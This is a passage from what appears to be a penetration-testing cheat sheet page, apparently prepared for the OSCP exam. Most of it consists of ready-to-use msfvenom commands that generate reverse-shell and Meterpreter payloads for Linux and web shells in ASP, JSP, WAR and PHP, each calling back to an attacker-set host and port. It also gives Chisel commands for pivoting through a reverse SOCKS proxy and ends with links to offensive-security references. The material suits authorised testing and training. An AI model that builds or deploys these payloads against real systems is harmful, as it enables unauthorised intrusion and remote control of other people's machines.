+<pre><code>msfvenom -p linux/x64/shell/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f elf &gt; shell-x64.elf
+</code></pre><h3 id="linux-stageless-reverse-tcp"><strong>Linux Stageless Reverse TCP</strong><a href="#linux-stageless-reverse-tcp" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p><strong>x86</strong></p>
+<pre><code>msfvenom -p linux/x86/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f elf &gt; shell-x86.elf
+</code></pre><p><strong>x64</strong></p>
+<pre><code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f elf &gt; shell-x64.elf
+</code></pre><h3 id="linux-staged-meterpreter"><strong>Linux Staged Meterpreter</strong><a href="#linux-staged-meterpreter" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p><strong>x86</strong></p>
+<pre><code>msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f elf &gt; shell-x86.elf
+</code></pre><p><strong>x64</strong></p>
+<pre><code>msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f elf &gt; shell-x64.elf
+</code></pre><h3 id="web-payloads"><strong>Web Payloads</strong><a href="#web-payloads" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p><strong>ASP</strong></p>
+<pre><code>msfvenom -p windows/shell/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f asp &gt; shell.asp
+</code></pre><p><strong>JSP</strong></p>
+<pre><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f raw &gt; shell.jsp
+</code></pre><p><strong>WAR</strong></p>
+<pre><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f war &gt; shell.war
+</code></pre><p><strong>PHP</strong></p>
+<pre><code>msfvenom -p php/reverse_php LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f raw &gt; shell.php
+</code></pre><h2 id="pivoting"><strong>Pivoting</strong><a href="#pivoting" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h3 id="chisel"><strong>Chisel</strong><a href="#chisel" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p><strong>Reverse SOCKS Proxy</strong></p>
+<pre><code># Kali
+./chisel server --reverse --port 9001
+
+# Windows
+.\chisel.exe client KALI_IP:9001 R:KALI_PORT:127.0.0.1:WINDOWS_PORT
+</code></pre><h2 id="other-cheat-sheets"><strong>Other Cheat Sheets</strong><a href="#other-cheat-sheets" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h2 id="resources"><strong>Resources</strong><a href="#resources" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p><a href="https://ceso.github.io/posts/2020/04/hacking/oscp-cheatsheet/">https://ceso.github.io/posts/2020/04/hacking/oscp-cheatsheet/</a><br>
+<a href="https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/">https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/</a><br>
+<a href="http://www.fuzzysecurity.com/tutorials/16.html">http://www.fuzzysecurity.com/tutorials/16.html</a><br>
+<a href="https://guide.bash.academy/">https://guide.bash.academy/</a><br>
+<a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/">https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/</a><br>
+<a href="https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/">https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/</a><br>
+<a href="https://www.corelan.be/index.php/2009/07/23/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2/">https://www.corelan.be/index.php/2009/07/23/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2/</a><br>
+<a href="https://awakened1712.github.io/oscp/oscp-transfer-files/">https://awakened1712.github.io/oscp/oscp-transfer-files/</a><br>
+<a href="https://blog.ropnop.com/transferring-files-from-kali-to-windows/">https://blog.ropnop.com/transferring-files-from-kali-to-windows/</a><br>
+<a href="https://thor-sec.com/cheatsheet/oscp/msfvenom_cheat_sheet/">https://thor-sec.com/cheatsheet/oscp/msfvenom_cheat_sheet/</a><br>
+<a href="https://github.com/frizb/MSF-Venom-Cheatsheet">https://github.com/frizb/MSF-Venom-Cheatsheet</a><br>
+<a href="https://jonathanh.co.uk/blog/upgrading-reverse-shells.html">https://jonathanh.co.uk/blog/upgrading-reverse-shells.html</a><br>
+<a href="https://github.com/swisskyrepo/PayloadsAllTheThings">https://github.com/swisskyrepo/PayloadsAllTheThings</a><br>
+<a href="https://www.netsecfocus.com/oscp/2019/03/29/The_Journey_to_Try_Harder-_TJNulls_Preparation_Guide_for_PWK_OSCP.html">https://www.netsecfocus.com/oscp/2019/03/29/The_Journey_to_Try_Harder-_TJNulls_Preparation_Guide_for_PWK_OSCP.html</a></p>
+
+      </div></div>
+
+  
+
+  
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2021 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="/assets/main.js"></script>
+<script src="/assets/prism.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
